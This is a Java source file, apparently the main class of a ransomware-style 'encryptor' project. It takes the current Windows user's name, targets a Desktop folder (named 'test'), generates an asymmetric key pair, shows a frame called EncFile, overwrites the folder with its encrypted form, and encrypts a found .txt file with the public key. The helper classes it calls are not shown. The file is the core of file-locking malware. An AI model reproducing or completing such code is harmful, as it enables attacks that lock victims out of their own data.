package encryptor;

import java.io.File;
import java.security.PublicKey;


public class AnotherName {
	
	public static void main(String[] args) throws Exception {
		

		String currentPcUser = System.getProperty("user.name");
	
		String src = "C:\\Users\\" + currentPcUser + "\\Desktop\\test";
		FileSearch fs = new FileSearch();
		GenerateKeys gk= GenerateKeys.getGenerateKeys();
		gk.generateTheKeys();
		EncFile frame = new EncFile();
		frame.setVisible(true);


		File f = new File(src);
	
		File tempFile = fs.searchDirectory(f, "txt");
		
		Encryptor enc = Encryptor.getEncrypter(true);
	    enc.encrypt(f, f);

		String fileSrc = tempFile.getAbsolutePath();
		TempFile tf = new TempFile();
		tf.setFile(tempFile);
		tf.setFileSrc(fileSrc);
		
	
		AsymmetricCryptography ac = AsymmetricCryptography.getAsymmetricCryptography();
		PublicKey publicKey1 = gk.getPublicKey();
		if (tempFile.exists()) {
			ac.enc(tempFile, fileSrc, publicKey1);
			
		} 
	}
}